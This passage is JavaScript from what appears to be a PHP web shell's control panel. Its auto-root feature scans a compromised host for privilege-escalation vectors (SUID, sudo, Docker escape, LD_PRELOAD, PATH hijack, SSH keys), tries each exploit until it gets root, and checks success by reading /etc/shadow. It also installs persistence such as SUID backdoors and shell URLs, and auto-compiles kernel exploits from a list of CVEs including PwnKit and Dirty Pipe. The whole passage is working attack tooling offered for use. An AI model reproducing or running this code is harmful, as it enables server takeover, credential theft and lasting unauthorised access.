                outputDiv.innerHTML = '<span style="color:#f44;">❌ Exploit failed!</span>\n\n' + escapeHtml(data.output);
                statusDiv.className = 'privesc-status error';
                statusDiv.innerHTML = '❌ Exploit failed!';
            }
        })
        .catch(error => {
            outputDiv.innerHTML = '<span style="color:#f44;">❌ Error: ' + escapeHtml(error.message) + '</span>';
        });
}

// 🔥 BRUTAL AUTO ROOT - Try ALL exploits, parallel scan, chain attacks
async function autoGetRoot() {
    const btn = document.getElementById('getRootBtn');
    const statusDiv = document.getElementById('privescStatus');
    const outputDiv = document.getElementById('privescOutput');
    const vectors = ['kernel', 'suid', 'sudo', 'capabilities', 'docker', 'writable', 'cron', 'services', 'ld_preload', 'path_hijacking', 'sudo_token', 'ssh_keys', 'env_variables'];
    const vectorNames = {
        kernel: '🐛 Kernel', suid: '⚡ SUID', sudo: '🔑 SUDO',
        capabilities: '🛡️ Caps', docker: '🐳 Docker',
        writable: '📝 Writable', cron: '⏰ Cron', services: '⚙️ Services',
        ld_preload: '🔧 LD_PRELOAD', path_hijacking: '🛤️ PATH',
        sudo_token: '🔐 Token', ssh_keys: '🔑 SSH Keys', env_variables: '🌐 Env'
    };
    
    // Reset UI
    btn.disabled = true;
    btn.innerHTML = '🔥 BRUTAL PRIVESC ACTIVE...';
    statusDiv.style.display = 'block';
    statusDiv.className = 'privesc-status';
    outputDiv.style.display = 'block';
    outputDiv.innerHTML = '';
    clearPrivescLog();
    
    // 🔥 Helper: Count vulnerabilities per vector
    const countVectorVulns = (vector, data) => {
        if (!data) return 0;
        switch(vector) {
            case 'kernel': return data.vulnerable ? (data.exploits?.length || 0) : 0;
            case 'suid': return data.exploitable?.length || 0;
            case 'sudo': return data.exploitable?.length || 0;
            case 'docker': return data.escape_possible ? (data.methods?.length || 0) : 0;
            case 'capabilities': return data.interesting?.length || 0;
            case 'ld_preload': return data.vulnerable ? (data.methods?.length || 0) : 0;
            case 'path_hijacking': return data.vulnerable ? (data.writable_dirs?.length || 0) : 0;
            case 'sudo_token': return data.has_token ? 1 : 0;
            case 'ssh_keys': return data.writable_keys?.length || 0;
            case 'writable': return data.writable_paths?.length || 0;
            case 'cron': return data.writable_crontabs?.length || (data.user_jobs?.length || 0);
            case 'services': return data.writable?.length || 0;
            case 'env_variables': return Object.keys(data.sensitive || {}).length;
            default: return 0;
        }
    };
    
    // Helper to add to output with timestamp
    const log = (msg, type = 'info') => {
        const now = new Date();
        const timeStr = now.toTimeString().substring(0, 8);
        const color = type === 'success' ? '#0f0' : type === 'error' ? '#f44' : type === 'warn' ? '#ff0' : '#6cf';
        const timeColor = '#666';
        outputDiv.innerHTML += '<span style="color:' + timeColor + '">[' + timeStr + ']</span> <span style="color:' + color + '">' + msg + '</span>\n';
        outputDiv.scrollTop = outputDiv.scrollHeight;
    };
    
    log('[*] 🔥🔥🔥 BRUTAL AUTO ROOT v2.0 🔥🔥🔥');
    log('[*] Mode: PARALLEL SCAN + CHAIN ATTACK + MULTI-EXPLOIT');
    log('[*] Target: ' + window.location.hostname);
    log('[*] Vectors: ' + vectors.length + ' privilege escalation checks');
    log('[*] =========================================\n');
    
    // 🔥 LIVE PROGRESS TRACKING
    let completedScans = 0;
    const totalScans = vectors.length;
    const scanStatus = {}; // Track status per vector
    
    // Initialize status
    vectors.forEach(v => scanStatus[v] = '⏳');
    
    function updateProgressDisplay() {
        const percent = Math.round((completedScans / totalScans) * 100);
        const progressBar = '█'.repeat(Math.floor(percent / 5)) + '░'.repeat(20 - Math.floor(percent / 5));
        
        statusDiv.innerHTML = `
            <div style="margin-bottom:8px;">
                <span style="color:#6cf;font-weight:bold;">⏳ Phase 1/4: PARALLEL SCANNING</span>
                <span style="color:#ff0;float:right;">${percent}%</span>
            </div>
            <div style="background:#111;border:1px solid #333;padding:3px;border-radius:3px;margin-bottom:8px;">
                <div style="background:linear-gradient(90deg,#0f0,#0a0);width:${percent}%;height:12px;border-radius:2px;transition:width 0.3s;"></div>
            </div>
            <div style="font-size:10px;color:#888;">${progressBar} ${completedScans}/${totalScans} vectors completed</div>
            <div style="margin-top:8px;font-size:11px;max-height:60px;overflow-y:auto;">
                ${vectors.map(v => `<span style="color:${scanStatus[v]==='✅'?'#0f0':scanStatus[v]==='❌'?'#f44':scanStatus[v]==='🔥'?'#ff0':'#6cf'}">${scanStatus[v]} ${vectorNames[v]}</span>`).join(' | ')}
            </div>
        `;
    }
    
    // Initial display
    updateProgressDisplay();
    log('[*] 🚀 Launching ' + totalScans + ' parallel scanners...');
    
    // Phase 1: PARALLEL SCAN with live updates
    const scanPromises = vectors.map(async (vector) => {
        scanStatus[vector] = '🔥'; // Mark as scanning
        updateProgressDisplay();
        
        try {
            log('[*] Scanning ' + vectorNames[vector] + '...');
            const response = await fetch('?masuk=<?php echo AL_SHELL_KEY ?>&action=privesc_scan_vector&vector=' + vector);
            const data = await response.json();
            
            completedScans++;
            scanStatus[vector] = data.success ? '✅' : '❌';
            updateProgressDisplay();
            
            // Real-time log for each completed vector
            if (data.success && data.data) {
                const vulnCount = countVectorVulns(vector, data.data);
                if (vulnCount > 0) {
                    log('[+] ' + vectorNames[vector] + ': ' + vulnCount + ' potential exploits found!', 'success');
                } else {
                    log('[✓] ' + vectorNames[vector] + ': Clean');
                }
            } else {
                log('[!] ' + vectorNames[vector] + ': Scan failed', 'error');
            }
            
            return { vector, data, success: data.success };
        } catch (err) {
            completedScans++;
            scanStatus[vector] = '❌';
            updateProgressDisplay();
            log('[!] ' + vectorNames[vector] + ': Error - ' + err.message, 'error');
            return { vector, error: err.message, success: false };
        }
    });
    
    const scanResults = await Promise.all(scanPromises);
    const results = {};
    const allExploits = []; // Collect ALL exploits from ALL vectors
    
    log('\n[*] =========================================');
    log('[*] SCAN COMPLETE - Collecting results...');
    log('[*] =========================================\n');
    
    scanResults.forEach(({ vector, data, success, error }) => {
        if (success && data && data.data) {
            results[vector] = data.data;
            
            // Collect ALL exploits, not just first one
            if (vector === 'suid' && data.data.exploitable?.length > 0) {
                data.data.exploitable.forEach((exp, idx) => {
                    allExploits.push({
                        type: 'suid', 
                        priority: 1, // High priority
                        data: exp,
                        name: exp.binary
                    });
                });
                log('[+] ⚡ SUID: ' + data.data.exploitable.length + ' binaries!', 'success');
            }
            else if (vector === 'sudo' && data.data.exploitable?.length > 0) {
                data.data.exploitable.forEach((exp, idx) => {
                    allExploits.push({
                        type: 'sudo', 
                        priority: 0, // Highest priority
                        data: exp,
                        name: exp.method
                    });
                });
                log('[+] 🔑 SUDO: ' + data.data.exploitable.length + ' misconfigs!', 'success');
            }
            else if (vector === 'docker' && data.data.escape_possible) {
                data.data.methods.forEach((method, idx) => {
                    allExploits.push({
                        type: 'docker', 
                        priority: 2,
                        data: method,
                        name: method.method
                    });
                });
                log('[+] 🐳 DOCKER: ' + data.data.methods.length + ' escape methods!', 'success');
            }
            else if (vector === 'kernel' && data.data?.vulnerable) {
                data.data.exploits?.forEach((exp, idx) => {
                    allExploits.push({
                        type: 'kernel', 
                        priority: 3, // Lower (need compilation)
                        data: exp,
                        name: exp.cve
                    });
                });
                log('[+] 🐛 KERNEL: ' + (data.data.exploits?.length || 0) + ' CVEs!', 'success');
            }
            else if (vector === 'capabilities' && data.data?.interesting?.length > 0) {
                allExploits.push({
                    type: 'capabilities',
                    priority: 4,
                    data: { caps: data.data.interesting },
                    name: 'Capabilities'
                });
                log('[+] 🛡️ CAPS: ' + data.data.interesting.length + ' caps', 'success');
            }
            // 🔥 ADVANCED VECTORS
            else if (vector === 'ld_preload' && data.data?.vulnerable) {
                data.data.methods?.forEach((method, idx) => {
                    allExploits.push({
                        type: 'ld_preload',
                        priority: 0, // Highest!
                        data: method,
                        name: method.type
                    });
                });
                log('[+] 🔧 LD_PRELOAD: ' + (data.data.methods?.length || 0) + ' methods!', 'success');
            }
            else if (vector === 'path_hijacking' && data.data?.vulnerable) {
                data.data.methods?.forEach((method, idx) => {
                    allExploits.push({
                        type: 'path_hijacking',
                        priority: 0, // Highest!
                        data: method,
                        name: 'PATH Hijack'
                    });
                });
                log('[+] 🛤️ PATH: ' + (data.data.writable_dirs?.length || 0) + ' writable dirs!', 'success');
            }
            else if (vector === 'sudo_token' && data.data?.has_token) {
                allExploits.push({
                    type: 'sudo_token',
                    priority: 0, // Highest!
                    data: data.data.methods?.[0],
                    name: 'Sudo Token'
                });
                log('[+] 🔐 SUDO TOKEN: Active for ' + (data.data.timeout || 0) + 's!', 'success');
            }
            else if (vector === 'ssh_keys' && data.data?.found) {
                data.data.keys?.forEach((key, idx) => {
                    if (key.writable) {
                        allExploits.push({
                            type: 'ssh_key',
                            priority: 2,
                            data: key,
                            name: key.path
                        });
                    }
                });
                log('[+] 🔑 SSH KEYS: ' + (data.data.keys?.length || 0) + ' found, ' + (data.data.writable_keys?.length || 0) + ' writable', 'success');
            }
            else {
                log('[✓] ' + vectorNames[vector] + ': Safe');
            }
        } else if (error) {
            log('[!] ' + vectorNames[vector] + ' error: ' + error, 'error');
        }
    });
    
    privescScanResults = results;
    displayPrivescResults(results);
    updatePrivescStats(results);
    
    // Sort by priority (lower = higher priority)
    allExploits.sort((a, b) => a.priority - b.priority);
    
    log('\n[*] =========================================');
    log('[*] SCAN COMPLETE: ' + allExploits.length + ' total exploits collected');
    log('[*] =========================================\n');
    
    if (allExploits.length === 0) {
        log('[!] ❌ NO EXPLOITS FOUND - SYSTEM IS HARDENED', 'error');
        btn.disabled = false;
        btn.innerHTML = '🔥 GET ROOT (AUTO) - RETRY';
        statusDiv.className = 'privesc-status error';
        statusDiv.innerHTML = '❌ No exploits found.';
        return;
    }
    
    // Phase 2: BRUTAL EXPLOITATION - Try ALL exploits until root
    log('[*] =========================================');
    log('[*] Phase 2/4: BRUTAL EXPLOITATION');
    log('[*] Trying ALL exploits until root obtained...');
    log('[*] =========================================\n');
    
    let rootObtained = false;
    let attempts = 0;
    const maxAttempts = allExploits.length;
    
    // Helper function untuk update exploit progress
    function updateExploitProgress(current, total, exploitName, exploitType, status = 'running') {
        const percent = Math.round((current / total) * 100);
        const progressBar = '█'.repeat(Math.floor(percent / 5)) + '░'.repeat(20 - Math.floor(percent / 5));
        const statusColor = status === 'success' ? '#0f0' : status === 'failed' ? '#f44' : '#ff0';
        const statusIcon = status === 'success' ? '✅' : status === 'failed' ? '❌' : '⏳';
        
        statusDiv.innerHTML = `
            <div style="margin-bottom:8px;">
                <span style="color:#f80;font-weight:bold;">⏳ Phase 2/4: BRUTAL EXPLOITATION</span>
                <span style="color:#ff0;float:right;">${percent}%</span>
            </div>
            <div style="background:#111;border:1px solid #333;padding:3px;border-radius:3px;margin-bottom:8px;">
                <div style="background:linear-gradient(90deg,#f80,#f44);width:${percent}%;height:12px;border-radius:2px;transition:width 0.3s;"></div>
            </div>
            <div style="font-size:10px;color:#888;">${progressBar} ${current}/${total} exploits tried</div>
            <div style="margin-top:8px;padding:8px;background:#1a1a1a;border-radius:4px;border-left:3px solid ${statusColor};">
                <div style="font-size:11px;color:${statusColor};">${statusIcon} ${exploitType.toUpperCase()}: ${exploitName.substring(0, 40)}${exploitName.length > 40 ? '...' : ''}</div>
            </div>
        `;
    }
    
    for (const exploit of allExploits) {
        attempts++;
        
        // Skip kernel exploits (need manual compilation)
        if (exploit.type === 'kernel') {
            updateExploitProgress(attempts, maxAttempts, exploit.name + ' (skipped - needs compile)', 'kernel', 'failed');
            log('[*] [' + attempts + '/' + maxAttempts + '] Skipping ' + exploit.name + ' (needs manual compile)', 'warn');
            await new Promise(r => setTimeout(r, 100));
            continue;
        }
        
        // Skip capabilities (manual execution)
        if (exploit.type === 'capabilities') {
            updateExploitProgress(attempts, maxAttempts, 'Capabilities (skipped - manual)', 'capabilities', 'failed');
            log('[*] [' + attempts + '/' + maxAttempts + '] Skipping capabilities (manual)', 'warn');
            await new Promise(r => setTimeout(r, 100));
            continue;
        }
        
        updateExploitProgress(attempts, maxAttempts, exploit.name, exploit.type, 'running');
        log('[*] [' + attempts + '/' + maxAttempts + '] Trying ' + exploit.type.toUpperCase() + ': ' + exploit.name);
        
        try {
            const formData = new FormData();
            formData.append('action', 'privesc_exploit');
            formData.append('method', exploit.type);
            formData.append('target', exploit.data.payload || exploit.data);
            
            const execResponse = await fetch('', { method: 'POST', body: formData });
            const execData = await execResponse.json();
            
            if (execData.success) {
                updateExploitProgress(attempts, maxAttempts, exploit.name + ' ✓ EXECUTED', exploit.type, 'success');
                log('[+] Exploit executed: ' + exploit.name, 'success');
                
                // IMMEDIATELY verify if root obtained - DOUBLE CHECK
                const isRoot = await verifyRootAccess();
                
                if (isRoot) {
                    // Double verification to prevent false positive
                    const doubleCheck = await verifyRootAccess();
                    if (doubleCheck) {
                        rootObtained = true;
                        log('[+] 🎉🎉🎉 ROOT OBTAINED ON ATTEMPT ' + attempts + '! 🎉🎉🎉', 'success');
                        log('[+] Vector: ' + exploit.type.toUpperCase() + ' - ' + exploit.name);
                        log('[+] ✅ Double verification passed!', 'success');
                        
                        // Update final success status
                        statusDiv.innerHTML = `
                            <div style="text-align:center;padding:10px;">
                                <div style="font-size:24px;margin-bottom:10px;">🎉</div>
                                <div style="color:#0f0;font-weight:bold;font-size:14px;">ROOT OBTAINED!</div>
                                <div style="color:#888;font-size:11px;margin-top:5px;">${exploit.type.toUpperCase()} - ${exploit.name}</div>
                                <div style="color:#6cf;font-size:10px;margin-top:5px;">Attempt ${attempts} of ${maxAttempts}</div>
                            </div>
                        `;
                        break; // STOP - we got root!
                    } else {
                        log('[!] ⚠️ First check passed but double-check failed (inconsistent)', 'warn');
                        updateExploitProgress(attempts, maxAttempts, exploit.name + ' ? INCONSISTENT', exploit.type, 'failed');
                    }
                } else {
                    updateExploitProgress(attempts, maxAttempts, exploit.name + ' ✓ (no root yet)', exploit.type, 'failed');
                    log('[!] Exploit executed but no root yet, continuing...', 'warn');
                }
            } else {
                updateExploitProgress(attempts, maxAttempts, exploit.name + ' ✗ FAILED', exploit.type, 'failed');
                log('[-] Failed: ' + (execData.output?.substring(0, 100) || 'No output'), 'error');
            }
        } catch (err) {
            updateExploitProgress(attempts, maxAttempts, exploit.name + ' ✗ ERROR', exploit.type, 'failed');
            log('[!] Error: ' + err.message, 'error');
        }
        
        // Small delay between attempts
        await new Promise(r => setTimeout(r, 500));
    }
    
    // Phase 3: CHAIN ATTACK - If single exploits failed, try combinations
    if (!rootObtained && allExploits.length >= 2) {
        log('\n[*] =========================================');
        log('[*] Phase 3/4: CHAIN ATTEMPT');
        log('[*] Trying exploit combinations...');
        log('[*] =========================================\n');
        
        statusDiv.innerHTML = `
            <div style="text-align:center;padding:15px;">
                <div style="color:#f80;font-weight:bold;">⏳ Phase 3/4: CHAIN ATTACK</div>
                <div style="color:#888;font-size:11px;margin-top:8px;">Trying exploit combinations...</div>
                <div style="margin-top:10px;font-size:20px;">🔗</div>
            </div>
        `;
        
        // Try SUID + Sudo chain
        const suidExp = allExploits.find(e => e.type === 'suid');
        const sudoExp = allExploits.find(e => e.type === 'sudo');
        
        if (suidExp && sudoExp) {
            log('[*] Trying SUID→SUDO chain...');
            statusDiv.innerHTML = `
                <div style="padding:10px;">
                    <div style="color:#f80;font-weight:bold;">⏳ CHAIN: SUID → SUDO</div>
                    <div style="color:#6cf;font-size:11px;margin-top:5px;">Step 1/2: Executing SUID exploit...</div>
                </div>
            `;
            // First SUID
            await tryExploit(suidExp);
            await new Promise(r => setTimeout(r, 1000));
            
            statusDiv.innerHTML = `
                <div style="padding:10px;">
                    <div style="color:#f80;font-weight:bold;">⏳ CHAIN: SUID → SUDO</div>
                    <div style="color:#6cf;font-size:11px;margin-top:5px;">Step 2/2: Executing SUDO exploit...</div>
                </div>
            `;
            // Then SUDO
            await tryExploit(sudoExp);
            
            const isRoot = await verifyRootAccess();
            if (isRoot) {
                rootObtained = true;
                log('[+] 🎉 ROOT via CHAIN ATTACK!', 'success');
            }
        }
    }
    
    // Phase 4: Verification
    if (rootObtained) {
        statusDiv.innerHTML = `
            <div style="padding:10px;">
                <div style="color:#0f0;font-weight:bold;">✅ Phase 4/4: ROOT CONFIRMED</div>
                <div style="color:#ff0;font-size:11px;margin-top:5px;">⚠️ Persistence NOT auto-installed</div>
                <div style="color:#6cf;font-size:10px;margin-top:5px;">Click 🔒 Persist button to install manually</div>
                <div style="margin-top:8px;">🔄 📝 🔑 🐚</div>
            </div>
        `;
        log('\n[*] =========================================');
        log('[*] Phase 4/4: VERIFICATION');
        log('[*] =========================================\n');
        
        // Comprehensive verification
        await performFullVerification(log);
        
        btn.innerHTML = '✅ ROOT OBTAINED';
        btn.style.background = 'linear-gradient(135deg, #0f0, #0a0)';
        statusDiv.className = 'privesc-status success';
        statusDiv.innerHTML = `
            <div style="padding:10px;">
                <div style="color:#0f0;font-weight:bold;">🎉 ROOT OBTAINED!</div>
                <div style="color:#0f0;font-size:11px;margin-top:5px;">✅ Interactive Root Terminal activated below!</div>
                <div style="color:#ff0;font-size:10px;margin-top:5px;">⚠️ Type commands in terminal or click 🔒 Persist for permanent access</div>
            </div>
        `;
        
        // 🎯 TAMPILKAN INTERACTIVE ROOT TERMINAL
        showRootTerminal();
        log('[*] 🎯 Interactive Root Terminal activated!', 'success');
        
        log('\n[*] =========================================');
        log('[*] ✅ BRUTAL AUTO-ROOT COMPLETE!', 'success');
        log('[*] Total attempts: ' + attempts);
        log('[*] Note: Use terminal below or install persistence', 'info');
        log('[*] Click "🔒 Persist" button to install manually');
        log('[*] =========================================');
        addPrivescLog('✅ BRUTAL ROOT COMPLETE! (No persistence)', 'success');
    } else {
        log('[!] ❌ ALL EXPLOITS FAILED', 'error');
        log('[*] Try manual exploitation with kernel exploits or custom payloads.\n');
        btn.disabled = false;
        btn.innerHTML = '🔥 GET ROOT (AUTO) - RETRY';
        statusDiv.className = 'privesc-status error';
        statusDiv.innerHTML = `
            <div style="padding:10px;">
                <div style="color:#f44;font-weight:bold;">❌ ALL EXPLOITS FAILED</div>
                <div style="color:#888;font-size:11px;margin-top:5px;">${allExploits.length} exploits tried, 0 successful</div>
                <div style="color:#6cf;font-size:10px;margin-top:5px;">Try: Kernel Auto-Compile or manual exploitation</div>
            </div>
        `;
    }
}

// Helper: Try single exploit
async function tryExploit(exploit) {
    try {
        const formData = new FormData();
        formData.append('action', 'privesc_exploit');
        formData.append('method', exploit.type);
        formData.append('target', exploit.data.payload || exploit.data);
        
        const response = await fetch('', { method: 'POST', body: formData });
        const data = await response.json();
        return data.success;
    } catch (e) {
        return false;
    }
}

// Helper: Quick root verification
async function verifyRootAccess() {
    try {
        // Run verification 3 times to ensure consistency
        let rootCount = 0;
        const checks = [
            'id',
            'whoami',
            'cat /proc/self/status | grep Uid'
        ];
        
        for (const cmd of checks) {
            const verifyForm = new FormData();
            verifyForm.append('cmd', cmd);
            verifyForm.append('masuk', '<?php echo AL_SHELL_KEY ?>');
            
            const response = await fetch('', { method: 'POST', body: verifyForm });
            const html = await response.text();
            
            // Strict checks - must match exactly
            if (cmd === 'id' && html.includes('uid=0(root)')) rootCount++;
            if (cmd === 'whoami' && html.includes('root') && !html.includes('u6')) rootCount++;
            if (cmd.includes('Uid') && html.includes('Uid:\t0')) rootCount++;
        }
        
        // Must pass at least 2 of 3 checks
        return rootCount >= 2;
    } catch (e) {
        return false;
    }
}

// Helper: Full verification
async function performFullVerification(log) {
    const checks = [
        { cmd: 'id', expect: 'uid=0(root)' },
        { cmd: 'whoami', expect: 'root' },
        { cmd: 'cat /etc/shadow 2>/dev/null | head -1', expect: ':' },
        { cmd: 'ps aux | grep root | head -3', expect: 'root' }
    ];
    
    for (const check of checks) {
        try {
            const formData = new FormData();
            formData.append('cmd', check.cmd);
            formData.append('masuk', '<?php echo AL_SHELL_KEY ?>');
            
            const response = await fetch('', { method: 'POST', body: formData });
            const html = await response.text();
            
            const passed = html.includes(check.expect);
            log((passed ? '[+] ✅ ' : '[-] ❌ ') + check.cmd + ': ' + (passed ? 'PASS' : 'FAIL'),
                passed ? 'success' : 'error');
        } catch (e) {
            log('[-] ❌ ' + check.cmd + ': ERROR', 'error');
        }
    }
}

// Async version with logging for autoGetRoot
async function installPersistenceWithLog() {
    const outputDiv = document.getElementById('privescOutput');
    outputDiv.style.display = 'block';
    outputDiv.innerHTML = '<span style="color:#6cf;">[PERSIST] Installing persistence mechanisms...</span>\n';
    addPrivescLog('Installing persistence...', 'info');
    
    try {
        const formData = new FormData();
        formData.append('action', 'install_persistence');
        
        const response = await fetch('', { method: 'POST', body: formData });
        const data = await response.json();
        
        if (data.success) {
            outputDiv.innerHTML += '\n<span style="color:#0f0;">✅ PERSISTENCE INSTALLED!</span>\n';
            outputDiv.innerHTML += '<span style="color:#ff0;">⚠️ SIMPAN INFORMASI INI!</span>\n\n';
            addPrivescLog('Persistence installed!', 'success');
            
            // 🎯 Check if terminal should be updated
            if (rootTerminalActive) {
                outputDiv.innerHTML += '<span style="color:#6cf;">🔄 Waiting for SUID backdoor to be ready...</span>\n';
                // Poll multiple times with increasing delay
                [1000, 2000, 3000, 5000].forEach((delay, i) => {
                    setTimeout(() => {
                        checkSuidBackdoor();
                        if (suidBackdoorPath && i === 3) {
                            outputDiv.innerHTML += '<span style="color:#0f0;">✅ Root terminal is now ready!</span>\n';
                        }
                    }, delay);
                });
            }
            
            for (const [method, info] of Object.entries(data.methods)) {
                const isInstalled = info.status === 'installed' || info.status === 'ready';
                const icon = isInstalled ? '✅' : '❌';
                
                outputDiv.innerHTML += '<span style="color:' + (isInstalled ? '#0f0' : '#f44') + '">' + icon + ' ' + method.toUpperCase() + '</span>\n';
                
                if (info.description) {
                    outputDiv.innerHTML += '   📋 ' + info.description + '\n';
                }
                
                // Access URLs
                if (info.access_urls && info.access_urls.length > 0) {
                    outputDiv.innerHTML += '   🔗 Access URLs:\n';
                    info.access_urls.forEach(url => {
                        outputDiv.innerHTML += '      → <a href="' + url + '" target="_blank" style="color:#0f0;">' + url + '</a>\n';
                    });
                }
                
                if (info.access_url) {
                    outputDiv.innerHTML += '   🔗 URL: <a href="' + info.access_url + '" target="_blank" style="color:#0f0;">' + info.access_url + '</a>\n';
                }
                
                // Private key URL
                if (info.private_key_url) {
                    outputDiv.innerHTML += '   🔑 Private key: <a href="' + info.private_key_url + '" target="_blank" style="color:#0f0;">' + info.private_key_url + '</a>\n';
                }
                
                if (info.how_to_use) {
                    outputDiv.innerHTML += '   💡 ' + info.how_to_use + '\n';
                }
                
                if (info.note) {
                    outputDiv.innerHTML += '   📝 Note: ' + info.note + '\n';
                }
                
                if (info.method) {
                    outputDiv.innerHTML += '   ⚙️ Method: ' + info.method + '\n';
                }
                
                outputDiv.innerHTML += '\n';
            }
            
            outputDiv.innerHTML += '\n<span style="color:#f44;">⚠️ ' + (data.warning || 'Simpan semua URL dan key!') + '</span>\n';
            
            // REKAP URLS
            if (data.all_urls && data.all_urls.length > 0) {
                outputDiv.innerHTML += '\n<span style="color:#0f0;">📋 SEMUA URL SHELL:</span>\n';
                data.all_urls.forEach((url, i) => {
                    outputDiv.innerHTML += '   ' + (i+1) + '. ' + url + '\n';
                });
            }
            
            // DOKUMENTASI
            if (data.documentation_file) {
                outputDiv.innerHTML += '\n<span style="color:#6cf;">📖 Dokumentasi: ' + data.documentation_file + '</span>\n';
            }
            
            outputDiv.scrollTop = outputDiv.scrollHeight;
            return true;
        } else {
            outputDiv.innerHTML += '<span style="color:#f44;">❌ Persistence installation failed</span>\n';
            addPrivescLog('Persistence failed', 'error');
            return false;
        }
    } catch (err) {
        outputDiv.innerHTML += '<span style="color:#f44;">❌ Error: ' + err.message + '</span>\n';
        addPrivescLog('Persistence error: ' + err.message, 'error');
        return false;
    }
}

// 🔥 ADVANCED ATTACK FUNCTIONS

async function kernelAutoCompile() {
    const outputDiv = document.getElementById('privescOutput');
    const statusDiv = document.getElementById('privescStatus');
    
    outputDiv.style.display = 'block';
    outputDiv.innerHTML = '<span style="color:#6cf;">[KERNEL AUTO-COMPILE] Checking kernel version and CVE database...</span>\n';
    statusDiv.style.display = 'block';
    statusDiv.innerHTML = '⏳ Phase 1/3: Detecting kernel version...';
    
    try {
        // Get kernel version
        const kernelVersion = await fetch('?masuk=<?php echo AL_SHELL_KEY ?>&action=privesc_scan_vector&vector=kernel')
            .then(r => r.json())
            .then(d => d.data?.version || 'unknown');
        
        outputDiv.innerHTML += '<span style="color:#0f0;">Kernel version: ' + kernelVersion + '</span>\n';
        
        // Known CVEs that can be auto-compiled
        // 🔥 EXTENSIVE CVE DATABASE FOR AUTO-COMPILE (25+ Exploits)
        const knownCves = [
            // 2016
            { cve: 'CVE-2016-0728', name: 'Keyring Ref Count', min: '3.8', max: '4.4.0', year: 2016 },
            { cve: 'CVE-2016-2384', name: 'USB MIDI', min: '0', max: '4.4.8', year: 2016 },
            { cve: 'CVE-2016-5195', name: 'Dirty COW', min: '2.6.22', max: '4.8.3', year: 2016 },
            { cve: 'CVE-2016-8655', name: 'AF_PACKET Race', min: '3.2', max: '4.8.13', year: 2016 },
            { cve: 'CVE-2016-9793', name: 'SO_SNDBUFFORCE', min: '0', max: '4.8.14', year: 2016 },
            // 2017
            { cve: 'CVE-2017-6074', name: 'DCCP Double Free', min: '2.6.18', max: '4.9.11', year: 2017 },
            { cve: 'CVE-2017-7308', name: 'AF_PACKET packet_set_ring', min: '0', max: '4.10.6', year: 2017 },
            { cve: 'CVE-2017-1000112', name: 'Ptmx Race', min: '2.6.18', max: '4.12.9', year: 2017 },
            { cve: 'CVE-2017-16995', name: 'BPF Verifier', min: '0', max: '4.14.11', year: 2017 },
            // 2018-2019
            { cve: 'CVE-2018-18955', name: 'UID Mapping', min: '4.15', max: '4.19.2', year: 2018 },
            { cve: 'CVE-2019-13272', name: 'PTRACE_TRACEME', min: '3.2', max: '5.1.16', year: 2019 },
            { cve: 'CVE-2019-15666', name: 'UDP Fragmentation', min: '0', max: '5.0.19', year: 2019 },
            { cve: 'CVE-2019-2215', name: 'Binder UAF', min: '3.14', max: '4.14.142', year: 2019 },
            // 2020-2021
            { cve: 'CVE-2020-8835', name: 'BPF Verifier SIGQUIT', min: '5.5', max: '5.6.2', year: 2020 },
            { cve: 'CVE-2020-14386', name: 'AF_PACKET Memory', min: '4.6', max: '5.7.10', year: 2020 },
            { cve: 'CVE-2021-22555', name: 'Netfilter Heap OOB', min: '0', max: '5.11.14', year: 2021 },
            { cve: 'CVE-2021-3493', name: 'OverlayFS', min: '0', max: '5.11', year: 2021 },
            { cve: 'CVE-2021-4034', name: 'PwnKit', min: '0', max: '5.16', year: 2021 },
            { cve: 'CVE-2021-3156', name: 'Sudo Baron Samedit', min: '0', max: '5.16', year: 2021 },
            { cve: 'CVE-2021-33909', name: 'Sequoia', min: '2.6.19', max: '5.13.3', year: 2021 },
            // 2022
            { cve: 'CVE-2022-0847', name: 'Dirty Pipe', min: '5.8', max: '5.16.11', year: 2022 },
            { cve: 'CVE-2022-0995', name: 'FUSE', min: '5.8', max: '5.17.3', year: 2022 },
            { cve: 'CVE-2022-2588', name: 'Dirty Cred', min: '0', max: '5.18', year: 2022 },
            { cve: 'CVE-2022-34918', name: 'Netfilter UAF', min: '5.8', max: '5.18.9', year: 2022 },
            // 2023
            { cve: 'CVE-2023-0386', name: 'OverlayFS FUSE', min: '5.11', max: '6.2', year: 2023 },
            { cve: 'CVE-2023-1829', name: 'TC Index UAF', min: '4.2', max: '6.2', year: 2023 },
            { cve: 'CVE-2023-31248', name: 'Netfilter UAF', min: '5.4', max: '6.3', year: 2023 },
            { cve: 'CVE-2023-32629', name: 'GameOver(lay)', min: '5.4', max: '6.3', year: 2023 },
            { cve: 'CVE-2023-35001', name: 'Netfilter Chain', min: '5.4', max: '6.3', year: 2023 },
            { cve: 'CVE-2023-4911', name: 'Looney Tunables', min: '2.34', max: '2.38', year: 2023 },
            // 2024
            { cve: 'CVE-2024-1086', name: 'Netfilter nf_tables', min: '5.14', max: '6.6.14', year: 2024 }
        ];
        
        outputDiv.innerHTML += '\n<span style="color:#6cf;">[' + knownCves.length + ' exploits in auto-compile database]</span>\n\n';
        outputDiv.innerHTML += '<span style="color:#6cf;">Available exploits by year:</span>\n';
        
        // Group by year
        const byYear = {};
        knownCves.forEach(exp => {
            if (!byYear[exp.year]) byYear[exp.year] = [];
            byYear[exp.year].push(exp);
        });
        
        Object.keys(byYear).sort((a,b) => b-a).forEach(year => {
            outputDiv.innerHTML += '<span style="color:#ff0;">' + year + '</span> (' + byYear[year].length + '): ';
            outputDiv.innerHTML += byYear[year].map(e => e.cve.replace('CVE-', '')).join(', ') + '\n';
        });
        
        // Let user choose or auto-select based on kernel version
        let targetCve = 'CVE-2021-4034'; // default most reliable
        statusDiv.innerHTML = '⏳ Phase 2/3: Downloading and compiling ' + targetCve + '...';
        outputDiv.innerHTML += '\n<span style="color:#6cf;">[+] Auto-compiling ' + targetCve + '...</span>\n';
        
        const formData = new FormData();
        formData.append('action', 'kernel_auto_compile');
        formData.append('cve', targetCve);
        formData.append('kernel_version', kernelVersion);
        
        const response = await fetch('', { method: 'POST', body: formData });
        const data = await response.json();
        
        if (data.success) {
            outputDiv.innerHTML += '<span style="color:#0f0;">✅ Auto-deploy successful!</span>\n';
            outputDiv.innerHTML += '<span style="color:#6cf;">Method: ' + (data.method || 'binary') + '</span>\n';
            outputDiv.innerHTML += '<span style="color:#6cf;">Path: ' + data.compiled_binary + '</span>\n';
            outputDiv.innerHTML += '\n<span style="color:#ff0;">Output:</span>\n' + data.output + '\n';
            
            statusDiv.innerHTML = '⏳ Phase 3/3: Executing exploit...';
            
            // Execute based on method type
            let execCmd = data.compiled_binary;
            if (data.method === 'python') {
                execCmd = 'python3 ' + data.compiled_binary + ' || python ' + data.compiled_binary;
            }
            
